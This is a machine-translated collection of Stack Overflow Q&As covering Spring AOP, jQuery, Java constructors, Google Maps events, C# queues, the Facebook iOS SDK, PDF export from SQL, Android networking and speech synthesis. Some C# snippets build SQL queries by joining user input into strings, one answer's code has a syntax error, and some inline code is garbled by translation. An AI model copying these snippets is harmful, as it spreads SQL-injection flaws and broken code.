        testMethod();
    }

    public void testMethod() {
        return;
    }
} 
```

如何拦截 Spring 框架本身调用的所有公共方法？（例如 TestComponent.init() 在 Spring 创建 TestComponent 实例期间）目前我只能`TestComponent.testMethod()`通过调用来拦截：

```
TestComponent testComponent = springContext.getBean(TestComponent.class);
testComponent.testMethod(); 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-02T10:02:41.313

这是您在使用 Spring AOP 时遇到的常见问题。Spring 通过代理建议的类来完成 AOP。在您的情况下，您的`TestComponent`实例将被包装在一个运行时代理类中，该类为要应用的任何方面建议提供“挂钩”。*当从类外部*调用方法时，这非常有效，但正如您发现的那样，它不适用于内部调用。原因是内部调用不会通过代理屏障，因此不会触发方面。

解决这个问题主要有两种方法。一种是从上下文中获取（代理）bean 的实例。这是您已经成功尝试过的方法。

另一种方法是使用称为加载时编织的东西。使用它时，自定义类加载器通过将字节码注入类定义中，将 AOP 建议添加到类（“编织”到类中）。Spring 文档对此有[更多](http://static.springsource.org/spring/docs/3.1.x/spring-framework-reference/html/aop.html#aop-aj-ltw)说明。

还有第三种方式，称为“编译时编织”。在这种情况下，您的 AOP 建议在编译时被静态地编织到每个建议类中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T15:55:21.027

`init()`没有任何显式的方式是无法拦截[的，详情请查看 SpringSource Jira](https://jira.springsource.org/browse/SPR-2740?focusedCommentId=20554&page=com.atlassian.jira.plugin.system.issuetabpanels%3acomment-tabpanel#comment-20554)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-09-02T07:24:50.807

您还可以尝试通过代理对象从 init() 调用内部 testMethod()，如[https://stackoverflow.com/a/5786362/6786382](https://stackoverflow.com/a/5786362/6786382)中解释的 Don 。

# jquery - 动态选择选项单选按钮

> ID：14111424
> 
> 赞同：1
> 
> 时间：2013-01-01T14:52:59.040
> 
> 标签：jquery

选择后的每个单选按钮都有自己的选择选项，请参阅下面的代码。

使用 jQuery，有人可以帮我让它工作吗？

```
<HEAD>

<script type="text/javascript" src="jquery-1.8.3.min.js"></script>
<script type="text/javascript">

  $('#machines input:radio').change(function() {

      var selectedVal = $("#machines input:radio:checked").val();
      if(1 == selectedVal){
          var bikeList = '<select name="Bikes"><option>Ducati</option><option>Kawasaki</option></select>';
          $('select').remove();
          $('#selectList').append(bikeList);
      }else if(2 == selectedVal){
          var carList = '<select name="Cars"><option>Audi</option><option>Nissan</option></select>';
          $('select').remove();
          $('#selectList').append(carList);
      }

  });
</script>

</HEAD>

<BODY>
  <div id="machines">
    <input type="radio" name="category" value="1" />Bikes 
    <input type="radio" name="category" value="2" />Cars
  </div>
  <div id="selectList"></div>

​&lt;/BODY> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T14:57:59.363

您应该将代码放在文档就绪处理程序中，注意`:radio`选择器已弃用。

```
$(document).ready(function(){
   var $list = $('#selectList'); // you can cache the object for better performace
   $('#machines input[type=radio]').change(function() {
      var selectedVal = this.value; // you can use `this` which refers to the currect input
      if (1 == selectedVal) {
          var bikeList = '<select name="Bikes"><option>Ducati</option><option>Kawasaki</option></select>';
          $list.html(bikeList);
      } else if (2 == selectedVal) {
          var carList = '<select name="Cars"><option>Audi</option><option>Nissan</option></select>';
          $list.html(carList);
      }
  });
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T15:00:18.513

好吧，我们可以通过设计解决其他问题。但是我认为如果我对您的代码进行尽可能少的更改以使其正常工作，那么学习起来会更容易。享受。

```
<HEAD>

<script type="text/javascript" src="jquery.min.js"></script>
<script type="text/javascript">
$(document).ready(function() {
  $('#machines input:radio').change(function() {
      var selectedVal = $("#machines input:radio:checked").val();
      if(1 == selectedVal){
      var bikeList = '<select name="Bikes"><option>Ducati</option><option>Kawasaki</option></select>';
      $('#selectList').html(bikeList);
      }else if(2 == selectedVal){
      var carList = '<select name="Cars"><option>Audi</option><option>Nissan</option></select>';
      $('#selectList').html(carList);
      }

  });
});
</script>

</HEAD>

<BODY>
  <div id="machines">
    <input type="radio" name="category" value="1" />Bikes 
    <input type="radio" name="category" value="2" />Cars
  </div>
  <div id="selectList"></div>

​&lt;/BODY> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-01T15:01:15.653

采用

```
$(document).ready(function(){
 // your code here
}); 
```

或将脚本放在 2 个单选按钮下

```
<HEAD>
<script type="text/javascript" src="jquery-1.8.3.min.js"></script>
</HEAD>

<BODY>
  <div id="machines">
    <input type="radio" name="category" value="1" />Bikes 
    <input type="radio" name="category" value="2" />Cars
  </div>
  <div id="selectList"></div>

<script type="text/javascript">
  $('#machines input:radio').change(function() {
      var selectedVal = $("#machines input:radio:checked").val();
      if(1 == selectedVal){
          var bikeList = '<select name="Bikes"><option>Ducati</option><option>Kawasaki</option></select>';
          $('select').remove();
          $('#selectList').append(bikeList);
      }else if(2 == selectedVal){
          var carList = '<select name="Cars"><option>Audi</option><option>Nissan</option></select>';
          $('select').remove();
          $('#selectList').append(carList);
      }
  });
</script>

​&lt;/BODY> 
```

# java - Java 中的组合 - 获得空输出

> ID：14111427
> 
> 赞同：-1
> 
> 时间：2013-01-01T14:54:02.270
> 
> 标签：java, composition

我是 java 新手，第一次尝试使用组合。我构建了一个名为 Person 的类，它以字符串名称和对象 pAddress 作为属性。它有两个构造函数和一个复制构造函数，一个设置 PAAddress 属性的方法和一个 String toString 方法：

```
public class Person {
private String name;
private Address pAddress;
    ///*constructor that gets the city, street, number, zip from    Address class*/
public Person (String name, String city, String street, int number, int zip)
{
    this.name=name;
    pAddress =new Address(city, street, number, zip);
}

public Person (String name, Address a)
{
    this.name=name;
    pAddress = new Address (a);
}
//**copy constructor**
public Person (Person other){
    this.name=other.name;
    this.pAddress= new Address (pAddress);}
//**set method for pAddress**
public void setPAddress(String city, String street, int number, int zip)
{
    pAddress.setCity(city);
    pAddress.setNumber(number);
    pAddress.setStreet(street);
    pAddress.setZip(zip);
}
**//String toString method**
public String toString(){
    return this.name  + ", " + pAddress; 
```

}

但是，当我尝试打印 String toString 方法时，我得到对象部分的 NULL 值。更具体：

```
public static void main (String[]args){

    Address Home=new Address("New York","5th Avenue", 112, 111);

    Person a=new Person("Carl",Home);

    System.out.println(a);
} 
```

最后一个 println 出来了：

```
Carl, Address: nullst., 0, null 
```

地址类如下所示：

```
public class Address {
private String city, street;
private int number, zip;
public Address (String c, String s, int n, int z){
    city=c;
    street=s;
    number=n;
    zip=z;
}
public Address (Address a)
{
    this.city=city;
    this.street=street;
    this.number=number;
    this.zip=zip;
}
public Address (String c, String s, int n)
{
    zip=0;
    city=c;
    street=s;
    number=n;
}

public String toString(){ 
if (zip==0)
    return "Address: " + street + "st., " + number + ", " + city ;
return "Address: " + street + "st., " + number + ", " + city  + ", " + zip;

} 
```

我添加了一个比较对象内的值的方法：

```
public boolean sameAddress(Person p){
Person b=new Person (p.getName(), p.getPAddress());
if (p.getName()==name) 
  return true; 
return false; 
```

它应该检查 Person 的地址是否是两个对象的名称。

```
public static void main (String[]args){
Address Home=new Address("New York","5th Avenue", 112, 111);
Person a=new Person("Carl",Home); 
Person b=new Person ("Carl",a.getPAddress()); 
System.out.println(b.sameAddress(a)); 
```

他们有相同的地址 我得到一个错误的答案 这里有什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T15:11:36.970

啊....我看到了你的问题。

在您向其发送地址的地址构造函数中：

```
public Address (Address a)
{
    this.city=city;
    this.street=street;
    this.number=number;
    this.zip=zip;
} 
```

您需要将其更改为：

```
public Address (Address a)
{
    this.city=a.getCity();
    this.street=a.getStreet();
    this.number=a.getNumber();
    this.zip=a.getZip();
} 
```

以及所有相应的 setter/getter。

# javascript - 在地图上连续点击 2 次

> ID：14111429
> 
> 赞同：0
> 
> 时间：2013-01-01T14:54:08.050
> 
> 标签：javascript, html, google-maps

我正在从信息窗口收集用户输入。在信息窗口上，我有一个“保存”按钮来保存用户的输入。但是当我点击那个按钮时，我也点击了地图，它会让我的标记移动到别处。单击“保存”按钮时，我只需要关闭信息窗口。我不想让我的标记移动。这是代码：

```
<body>
<script>
var infowindow, marker;
function initialize()
{
var myCenter = new google.maps.LatLng( 10.771654, 106.698285 );
var mapProp = {
center: myCenter,
zoom: 14,
mapTypeId: google.maps.MapTypeId.ROADMAP
    };
    var map = new google.maps.Map(document.getElementById("googleMap"),  
    mapProp);   

    var html = "<div>Comment:<br/>" +
           "<textarea id='text_map' cols='25' rows='4'></textarea>" + 
           "<input type='button' onclick='set_data()' value='Save'/>" + 
            "</div>";

    infowindow = new google.maps.InfoWindow({
         content: html
    });

    marker = new google.maps.Marker({
    });

    google.maps.event.addListener(map, 'click', function(event)      
    {                       
    var location = event.latLng;        
    marker.setPosition(location);
    marker.setMap(map);
        infowindow.open(map,marker);    

    });

    google.maps.event.addListener(marker, 'click', function() { 

       infowindow.open(map,marker);                     
    }); 
}

function set_data()
{
   //do something                     
   infowindow.close();                      
}
function loadScript()
{
   var script = document.createElement("script");
   script.type = "text/javascript";
   script.src = "http://maps.googleapis.com/maps/api" +    
   "/js?key=AIzaSyDY0kkJiTPVd2U7aTOAwhc9ySH6oHxOIYM&sensor=false&callback=initialize";
   document.body.appendChild(script);
}
window.onload = loadScript;
</script>
<div id="googleMap" style="width: 500px; height: 500px"></div>

</body>
</html> 
```

奇怪的是我在 IE 9 上没有这个问题，但在 FireFox 和 CHROME 上。

编辑：

为了解决这个问题，我只需要停止事件传播。我是这样做的：将事件作为函数 set_data() 的参数传递

onclick='var 事件 = 参数[0] || 窗口.事件；设置数据（事件）'

在 set_data 添加这行代码：

e.stopPropagation();

感谢 Berend 提供有用的链接。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T15:49:53.480

一个事件将冒泡或捕获 dom 树。唉，对我们来说，IE 使用的模型与 Chrome 和 Firefox 不同。见[http://www.quirksmode.org/js/events_order.html](http://www.quirksmode.org/js/events_order.html)

如果没有停止，事件将继续在 DOM 树上或下传播。这就是您所体验到的：点击事件被按钮以及 chrome 和 Firefox 中的地图捕获。由于 IE 使用不同的模型，这在 IE9 中不会发生。

要停止事件传播，请使用：

```
e.stopPropagation(); 
```

此处还讨论了该解决方案 [如何使用内联 onclick 属性停止事件传播？](https://stackoverflow.com/questions/387736/how-to-stop-event-propagation-with-inline-onclick-attribute)

# c# - ConcurrentQueue vs Queue + lock 的性能

> ID：14111431
> 
> 赞同：23
> 
> 时间：2013-01-01T14:54:09.173
> 
> 标签：c#

我必须实现一个消费者一个生产者的标准算法。我可以很容易地使用`Queue`和几个`lock`语句来实现它。或者我可以只使用`ConcurrentQueue`. 什么是更好的？

如果`Queue + lock`使用，那么我可以优化“多次添加/检索”，因为我可以`lock`一次又一次地`Add`多次。

在一般情况下什么更快 -`ConcurrentQueue`或者`Queue + lock`差异有多大？当然`ConcurrentQueue`是最直接的方式，但我不想失去很多性能，因为我在 HFT 交易应用程序中使用它。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2013-01-01T15:01:58.373

简而言之，来自[C#](https://rads.stackoverflow.com/amzn/click/com/B0043D2DN2)：

> 并发堆栈、队列和包类在内部使用链表实现。这使得它们的内存效率低于非并发`Stack`和`Queue`类，但更适合并发访问，因为链表有助于无锁或低锁实现。

换句话说，很难定义一个一般情况，更不用说预测性能的差异是什么了。

这取决于集合的大小和使用情况。如果有足够的并发访问，可以预期性能会更好，内存消耗会更糟。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2022-01-22T17:39:03.727

此外，来自[有关 ConcurrentQueue(T) 与 Queue(T) 的 Microsoft 文档](https://docs.microsoft.com/en-us/dotnet/standard/collections/thread-safe/when-to-use-a-thread-safe-collection#concurrentqueuet-vs-queuet)：

> 在纯生产者-消费者场景中，每个元素的处理时间非常短（几条指令），然后 System.Collections.Concurrent.ConcurrentQueue 可以提供比具有外部锁的 System.Collections.Generic.Queue 适度的性能优势. 在这种情况下，当一个专用线程在排队并且一个专用线程在出队时，ConcurrentQueue 的性能最好。如果您不强制执行此规则，那么在具有多个内核的计算机上，Queue 甚至可能比 ConcurrentQueue 执行得稍快。
> 
> 当处理时间约为 500 FLOPS（浮点运算）或更多时，则双线程规则不适用于 ConcurrentQueue，因此具有很好的可扩展性。在这种情况下，队列不能很好地扩展。
> 
> 在生产者-消费者混合场景中，当处理时间非常短时，具有外部锁的队列比 ConcurrentQueue 具有更好的扩展性。但是，当处理时间约为 500 FLOPS 或更多时，ConcurrentQueue 的扩展性更好。

# ios - Facebook SDK 问题

> ID：14111441
> 
> 赞同：2
> 
> 时间：2013-01-01T14:55:25.053
> 
> 标签：ios, objective-c, facebook, facebook-ios-sdk

我在我的 iPhone 应用程序中创建了一个 facebook 身份验证，为此我遵循 [了本](http://developers.facebook.com/docs/tutorials/ios-sdk-tutorial/authenticate/)教程。但是除了一行代码，就是

```
- (void)applicationDidBecomeActive:(UIApplication *)application
{
    [FBSession.activeSession handleDidBecomeActive];
} 
```

当我使用它时，它是一个错误显示：

> 'FBSession' 没有可见的@interface 声明选择器 handleDidBecomeActive

但是当我单击登录按钮时，身份验证仍然可以正常工作，问题是我的身份验证窗口只显示“基本信息”-我还需要访问“代表您发布”

```
 My authentication window is             I need to authenticate 
              like this                    like this (as in FB tutorial) 
```

![在此处输入图像描述](../Images/0d41dd69403a7c1d7c2846bef13e8400.png)![在此处输入图像描述](../Images/8b4cc7e37997b87c0fa1e79657881d61.png)

无法找出错误，是在 Facebook 中创建应用程序还是我在 iPhone 编码中的身份验证错误。如果有人得到错误，请帮助我澄清

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T18:05:38.420

写一个测试项目，我不能重复你的错误信息；

```
No visible @interface for 'FBSession' declares the selector handleDidBecomeActive 
```

使用 Facebook SDK 3.1.1 编译时（没有 3.1 方便测试）。这似乎与版本相关，因为它`handleDidBecomeActive`是 3.1 版本中的新内容，并且该消息与编译器没有看到选择器有关。

另外，关于您的许可问题；权限系统在 3.1 版本中已更改为不允许您同时请求读取和写入权限。引用自[3.1 迁移文档](https://developers.facebook.com/docs/tutorial/iossdk/upgrading-from-3.0-to-3.1/)；

> 您现在需要*单独*（并按此顺序）请求阅读和发布权限。最有可能的是，当应用程序启动并且用户首次登录时，您将请求读取权限以进行个性化。稍后，如果合适，您的应用程序可以在打算将数据发布到 Facebook 时请求发布权限。

我可以在登录时请求读取权限（这就是您所看到的），但是正如您所看到的，您不能同时请求发布权限。如果我，正如 SDK 所暗示的那样，稍后请求该权限，它似乎可以正常工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T15:46:33.550

我使用了您仅在 iOS 6 及更高版本中编写的代码。你应该试试这个代码：

```
- (void)applicationDidBecomeActive:(UIApplication *)application
{
    if ([[[UIDevice currentDevice] systemVersion]integerValue] >= __IPHONE_6_0) {
        [FBSession.activeSession handleDidBecomeActive];
    }

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-23T08:04:00.997

我知道这是一篇旧帖子，但我发现这可能会帮助遇到同样问题的人，所以我在这里发布我的解决方案。我正在使用 FacebookSDK v3.1，今天遇到了同样的问题。这是因为我在目标搜索路径中仍然有较旧的 FacebookSDK v3.0 路径。只要确保在 Targets Search Paths 中输入了正确的 FacebookSDK 路径，编译器就不会报错。

# c# - 将二进制数据转换为 pdf 文件

> ID：14111442
> 
> 赞同：5
> 
> 时间：2013-01-01T14:55:36.407
> 
> 标签：c#

我正在尝试将二进制数据转换为其原始格式“.PDF”，但我不喜欢任何一种解决方案。第一个是一个小文件，它会创建一个 PDF 文件，但它看起来是空的。第二个也创建了一个 PDF 文件，但我无法打开它。错误在哪里？

第一个代码：

```
Conn.Open();
SqlCommand cmd = Conn.CreateCommand();
cmd.CommandText = "Select Artigo From Artigo WHERE (IDArtigo ='" + id + "')";
byte[] binaryData = (byte[])cmd.ExecuteScalar();

string s = Encoding.UTF8.GetString(binaryData);

File.WriteAllText("algo.pdf", s); 
```

第二个代码：

```
Conn.Open();
SqlCommand cmd = Conn.CreateCommand();
cmd.CommandText = "Select Artigo From Artigo WHERE (IDArtigo ='" + id + "')";
byte[] binaryData = (byte[])cmd.ExecuteScalar();

// Convert the binary input into Base64 UUEncoded output.
string base64String;
try
{
    base64String = System.Convert.ToBase64String(binaryData, 0, binaryData.Length);
}
catch (System.ArgumentNullException)
{
    MessageBox.Show("Binary data array is null.");
    return;
}

cmd.CommandText = "Select Titulo From Artigo WHERE (IDArtigo ='" + id + "')";
string titulo = (string)cmd.ExecuteScalar();

// Write the UUEncoded version to the output file.
System.IO.StreamWriter outFile;
try
{
    outFile = new StreamWriter(titulo + ".pdf", false, System.Text.Encoding.ASCII);
    outFile.Write(base64String);
    outFile.Close();
}
catch (System.Exception exp)
{
    System.Console.WriteLine("{0}", exp.Message);
} 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-01-01T15:00:27.240

您正在将文件编写为文本，但您应该编写原始字节。.PDF 文件是二进制文件，而不是文本文件，因此实际上，您在第一个代码示例中填充了错误的数据。

尝试

```
 Conn.Open();
    SqlCommand cmd = Conn.CreateCommand();
    cmd.CommandText = "Select Artigo From Artigo WHERE (IDArtigo = @id)";
    cmd.Parameters.AddWithValue("@id", id);
    byte[] binaryData = (byte[])cmd.ExecuteScalar();
    File.WriteAllBytes(("algo.pdf", binaryData);
    string s = Encoding.UTF8.GetString(binaryData); 
```

如果您有更多问题，System.IO.File.WriteAllBytes 记录在[http://msdn.microsoft.com/en-us/library/system.io.file.writeallbytes.aspx 。](http://msdn.microsoft.com/en-us/library/system.io.file.writeallbytes.aspx)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-01T14:58:25.053

使用原始数据 (binaryData) 尝试 File.WriteAllBytes，不要尝试将其转换为其他任何内容

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-12T01:18:04.857

```
string sql = "select Lsn_File from Lessons_tbl where Lsn_name = '"TextBox1.Text + "'";

        cmd = new SqlCommand(sql, dal.cn());

        dal.Open();
        SqlDataReader dr = cmd.ExecuteReader();

         dr.Read();
         if (dr.HasRows)
           {             
              byte[] lesson = (byte[])(dr[0]);
              spathfile = System.IO.Path.GetTempFileName();
              //move from soures to destination the extension until now is .temp
             System.IO.File.Move(spathfile, 
              System.IO.Path.ChangeExtension(spathfile,".pdf"));
                //make it real pdf file  extension .pdf
              spathfile = System.IO.Path.ChangeExtension(spathfile, ".pdf");
               System.IO.File.WriteAllBytes(spathfile, lesson );

               this.axAcroPDF1.LoadFile(spathfile);
         dal.close(); 
```

# android - 错误下载文件httppost

> ID：14111447
> 
> 赞同：0
> 
> 时间：2013-01-01T14:56:38.987
> 
> 标签：android, file, download

我需要从网上下载一个 json 文件。首先我想说我使用的链接是有效的。这是代码：

```
private String getJsonFromUrl(String url) {
        String json = null;

        try {
            DefaultHttpClient httpClient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost(url);

            HttpResponse httpResponse = httpClient.execute(httpPost);
            HttpEntity httpEntity = httpResponse.getEntity();
            json = EntityUtils.toString(httpEntity);

        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        // return json
        return json;
    } 
```

问题是我收到一个错误：

```
01-01 15:52:45.130: E/AndroidRuntime(6303): FATAL EXCEPTION: main
01-01 15:52:45.130: E/AndroidRuntime(6303): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.example.player/com.example.player.PlaySongActivity}: android.os.NetworkOnMainThreadException
01-01 15:52:45.130: E/AndroidRuntime(6303):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2185)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2210)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at android.app.ActivityThread.access$600(ActivityThread.java:142)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1208)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at android.os.Handler.dispatchMessage(Handler.java:99)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at android.os.Looper.loop(Looper.java:137)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at android.app.ActivityThread.main(ActivityThread.java:4931)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at java.lang.reflect.Method.invokeNative(Native Method)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at java.lang.reflect.Method.invoke(Method.java:511)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:791)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:558)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at dalvik.system.NativeStart.main(Native Method)
01-01 15:52:45.130: E/AndroidRuntime(6303): Caused by: android.os.NetworkOnMainThreadException
01-01 15:52:45.130: E/AndroidRuntime(6303):     at android.os.StrictMode$AndroidBlockGuardPolicy.onNetwork(StrictMode.java:1117)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at java.net.InetAddress.lookupHostByName(InetAddress.java:385)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at java.net.InetAddress.getAllByNameImpl(InetAddress.java:236)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at java.net.InetAddress.getAllByName(InetAddress.java:214)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at org.apache.http.impl.conn.DefaultClientConnectionOperator.openConnection(DefaultClientConnectionOperator.java:137)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at org.apache.http.impl.conn.AbstractPoolEntry.open(AbstractPoolEntry.java:164)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at org.apache.http.impl.conn.AbstractPooledConnAdapter.open(AbstractPooledConnAdapter.java:119)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at org.apache.http.impl.client.DefaultRequestDirector.execute(DefaultRequestDirector.java:360)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:555)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:487)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:465)
01-01 15:52:45.130: E/AndroidRuntime(6303):     at com.example.player.DBManagement.LastFM.getJsonFromUrl(LastFM.java:243) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T15:24:49.727

`NetworkOnMainThreadException`- 你不能在主 UI 线程上运行你的网络东西。您需要启动一个新线程来运行您的 httpPost，或者通过摆弄严格模式来解决问题。搜索堆栈溢出。这个问题有很多答案。[这是避免 NetworkOnMainThreadException](https://stackoverflow.com/q/11084755/1689695)的答案

# view - Interface Builder: Dismiss Modal View Controller without code

> ID：14111448
> 
> 赞同：3
> 
> 时间：2013-01-01T14:56:40.987
> 
> 标签：view, controller, interface-builder, modal-dialog, dismiss

是否可以仅在 Interface Builder 中关闭模态视图控制器（例如 Page Curl）？

我目前的方法总是使用 IBAction 创建一个新的 ViewController 子类，`dismissModalViewController`我想知道是否可以在 IB 中执行此步骤来节省一些空间/时间。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-01T15:03:53.173

不，你不能，因为 Interface builder 只是一个布局文件，它不运行任何代码。

但是，如果您愿意，您可以创建一个自定义 UIButton 子类，并将该按钮设置为在单击时始终关闭模态视图控制器。因此，每当您需要关闭模态视图控制器时，您可以在您的 IB 中添加一个 UIButton，该 UIButton 设置为您创建的子类的一个类，它将为您完成工作。

# c# - 使用其他语音时的文本到语音 SAPI5 AccessViolationException

> ID：14111456
> 
> 赞同：3
> 
> 时间：2013-01-01T14:58:17.270
> 
> 标签：c#, winforms, .net-3.5, text-to-speech, sapi

我已经为 SAPI5 Eliska22k 安装了捷克语语音。它在 Windows 7 上运行良好。现在我有 Windows 8 并且在调用`Speak`方法时它给了我`Attempted to read or write protected memory. This is often an indication that other memory is corrupt.`

我也尝试使用`SpeechSynthesizer`.NET System.Speech。它还可以看到已安装的语音 Eliska22k（在 W7 上它仅适用于 SAPI5），但它不会写入任何不会启动的异常。在`SelectVoice("Eliska22k")`方法程序上退出。

默认语音在 SAPI5 中也可以在默认语音中正常工作。

我已经安装了`SpeechPad`，它可以很好地与语音 Eliska22k 配合使用。我找不到问题所在。

```
SpeechSynthesizer voice = new SpeechSynthesizer();

voice.SelectVoice("Eliska22k");// here program just exit without any exeption
voice.Rate = 2;

voice.SpeakAsync("Ahoj, jak se máš?"); 
```

SAPI5

```
SpVoice voice = new SpVoice();

voice.Voice = voice.GetVoices().Item(6);// index of eliska voice
voice.Rate = 2;

voice.Speak("Ahoj, jak se máš?", SpeechVoiceSpeakFlags.SVSFlagsAsync);//here occurs exeption 
```

谢谢你的想法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-10T07:48:19.827

不确定这是否是答案，但是每当我尝试重复使用相同的媒体元素来一遍又一遍地播放不同的流时（例如，用户正在按钮混搭），我都会遇到同样的错误。解决方案是使用显式 GC.Collect()。尽管拥有 5 个媒体元素也不错，因为它似乎可以通过停止和重新启动音频来加快速度。

```
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices.WindowsRuntime;
using System.Threading.Tasks;
using Windows.Foundation;
using Windows.Foundation.Collections;
using Windows.Media.SpeechSynthesis;
using Windows.UI.Xaml;
using Windows.UI.Xaml.Controls;
using Windows.UI.Xaml.Controls.Primitives;
using Windows.UI.Xaml.Data;
using Windows.UI.Xaml.Input;
using Windows.UI.Xaml.Media;
using Windows.UI.Xaml.Navigation;

// The Blank Page item template is documented at http://go.microsoft.com/fwlink/?LinkId=234238

namespace SpeechMark
{
  /// <summary>
  /// An empty page that can be used on its own or navigated to within a Frame.
  /// </summary>
  public sealed partial class BlankPage1 : Page
  {
    public BlankPage1()
    {
      this.InitializeComponent();

      m_button.Click += m_button_Click;

      m_audioPlayerPool = new MediaElement[5];
      for(int index = 0; index < m_audioPlayerPool.Length; index++)
      {
        var audioPlayer = new MediaElement();
        audioPlayer.AutoPlay = true;
        m_audioPlayerPool[index] = audioPlayer;
        m_grid.Children.Add(audioPlayer);
      }

      m_textToSpeech = new SpeechSynthesizer();
    }

    async void m_button_Click(object sender, RoutedEventArgs e)
    {
      m_button.IsEnabled = false;
      if (m_audioPlayer != null)
      {
        m_audioPlayer.Stop();
      }

      if (m_stream != null)
      {
        m_stream.Dispose();
        m_stream = null;
      }

      GC.Collect();

      m_audioPlayer = m_audioPlayerPool[m_nextAudioPlayerToUse];
      m_nextAudioPlayerToUse = (m_nextAudioPlayerToUse + 1) % m_audioPlayerPool.Length;

      string ssml = "<speak version=\"1.0\" xmlns=\"http://www.w3.org/2001/10/synthesis\" xml:lang=\"en\"><voice gender=\"female\" xml:lang=\"en\"><prosody rate=\"1\">how are you doing</prosody><mark name=\"utteranceComplete\"/></voice></speak>";
      m_stream = await m_textToSpeech.SynthesizeSsmlToStreamAsync(ssml);
      m_audioPlayer.SetSource(m_stream, m_stream.ContentType);

      m_button.IsEnabled = true;
    }

    private MediaElement m_audioPlayer;
    private MediaElement[] m_audioPlayerPool;
    private int m_nextAudioPlayerToUse = 0;
    private SpeechSynthesizer m_textToSpeech;
    public SpeechSynthesisStream m_stream { get; set; }
  }
} 
```

xml:

```
<Page
    x:Class="SpeechMark.BlankPage1"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:local="using:SpeechMark"
    xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
    xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
    mc:Ignorable="d">

    <Grid x:Name="m_grid" Background="{ThemeResource ApplicationPageBackgroundThemeBrush}">
    <Button x:Name="m_button" Height="128" Margin="446,303,0,337" Width="256"/>
  </Grid>
</Page> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-10T15:39:33.250

据我所知，该软件尚未与 Windows 8 兼容。

Xtranormal 开发了这些语音包，以将其文本作为附加功能添加到动画软件中。

查看[PC World](http://www.pcworld.com/product/952356/xtranormal-state.html)对该软件的评论表明，他们的 2.5 测试版的规格适用于 Windows XP 和 Windows Vista。

请注意，PCWorld 审查是在 2010 年进行的。在此审查之后集成了 Windows 7 支持。

注意到 Windows 7 发布的滞后以及该软件升级到 Windows 7 兼容性也加强了我的论点，即 Windows 8 还没有准备好。（windows 7 发布 5 个月后 pc world 审查了这个软件，它与 windows 7 不兼容，windows 8 还没有推出那么久，升级软件需要时间；））

[在他们自己的网站](http://www.xtranormal.com/about-desktop)上查看他们的技术细节，建议最迟使用 Windows 7 的推荐设置。

这对我来说表明他们尚未将其更新到 Windows 8。

（作为一个额外的脚注，YouTube 上没有关于这个软件的 Windows 8 的单一教程，但有很多其他操作系统的教程，人们最近制作了关于任何东西的教程，并且缺少这个操作系统的教程（尽管应用程序在2 年的期限再次表明，还没有 Windows 8 ;)

脚注上的注释，Software Informer 是一个网站，几乎所有可用的软件都经过审查，旧版本收到了 2 - 3 条评论，而最新版本提交了 260 条评论，因此已知的受欢迎程度有所提高）

脚注 2；我专注于该软件的原因是因为声音最初是为该软件设计的。因此，如果语音要升级，他们打算首先使用的软件可能会先升级）

你认为他们只会在他们的网站上说他们支持什么操作系统：/

# python - Python HTTPServer 和 TCPServer 的性能

> ID：14111460
> 
> 赞同：4
> 
